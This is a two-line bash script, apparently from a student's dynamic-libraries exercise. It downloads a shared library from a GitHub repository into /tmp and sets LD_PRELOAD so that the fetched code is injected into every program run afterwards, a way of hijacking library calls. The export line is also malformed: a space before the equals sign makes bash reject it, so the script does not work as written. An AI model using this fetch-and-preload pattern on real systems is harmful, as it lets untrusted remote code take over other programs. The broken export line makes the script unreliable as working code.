#!/bin/bash
wget -P /tmp/ https://raw.github.com/0sei531/alx-low_level_programming/master/0x18-dynamic_libraries/libtry.so
export LD_PRELOAD =/tmp/libtry.so
